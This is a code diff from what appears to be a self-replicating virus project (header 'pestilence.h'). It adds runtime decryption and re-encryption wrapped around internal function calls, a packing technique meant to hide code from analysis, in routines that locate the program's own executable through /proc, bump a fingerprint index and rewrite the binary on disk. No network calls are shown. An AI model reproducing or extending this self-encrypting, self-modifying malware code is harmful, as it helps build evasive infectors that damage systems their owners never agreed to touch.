@@ -1,6 +1,6 @@
 #include  "pestilence.h"
 
-static void	get_path_own_file(char *buf)
+void	get_path_own_file(char *buf, t_info *info)
 {
 	char	path_sym[PATH_MAX];
 	pid_t	pid;
@@ -8,14 +8,16 @@ static void	get_path_own_file(char *buf)
 	ft_memset(path_sym, PATH_MAX, '\0');
 	write_proc(path_sym);
 	pid = ft_sysgetpid();
+	uint32_t key = decrypt_func(info, &itoa, info->tab_addr[12 + 1] - info->tab_addr[12], 12);
 	itoa(buf, pid);
+	reencrypt_func(info, &itoa, info->tab_addr[12 + 1] - info->tab_addr[12], key);
 	ft_strcat(path_sym, buf);
 	write_exe(buf);
 	ft_strcat(path_sym, buf);
 	ft_sysreadlink(path_sym, buf, PATH_MAX);
 }
 
-static void	rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st)
+void	rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st)
 {
 	ft_sysclose(fd);
 	if (ft_sysunlink(path) < 0)
@@ -26,7 +28,7 @@ static void	rewrite_own_file(char *path, void *file, size_t size, int fd, struct
 	ft_sysclose(fd);
 }
 
-void		update_own_index(t_fingerprint *fingerprint)
+void		update_own_index(t_fingerprint *fingerprint, t_info *info)
 {
 	char			path[PATH_MAX];
 	struct stat		st;
@@ -38,7 +40,10 @@ void		update_own_index(t_fingerprint *fingerprint)
 	uint32_t		new_index;
 
 	ft_memset(path, PATH_MAX, '\0');
-	get_path_own_file(path);
+	uint32_t key = decrypt_func(info, &get_path_own_file, info->tab_addr[18] - info->tab_addr[17], 17);
+	get_path_own_file(path, info);
+	reencrypt_func(info, &get_path_own_file, info->tab_addr[18] - info->tab_addr[17], key);
+
 	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
 		return ;
 	ft_sysfstat(fd, &st);
@@ -63,10 +68,11 @@ void		update_own_index(t_fingerprint *fingerprint)
 		fingerprint->index = *((uint32_t *)(addr));
 	new_index = fingerprint->index + fingerprint->fingerprint;
 	ft_memcpy(addr, &new_index, 4);
+	key = decrypt_func(info, &rewrite_own_file, info->tab_addr[19] - info->tab_addr[18], 18);
 	rewrite_own_file(path, file, st.st_size, fd, st);
+	reencrypt_func(info, &rewrite_own_file, info->tab_addr[19] - info->tab_addr[18], key);
 	ft_sysmunmap(file, st.st_size);
 end_close:
 	ft_sysclose(fd);
 	return ;
 }
-
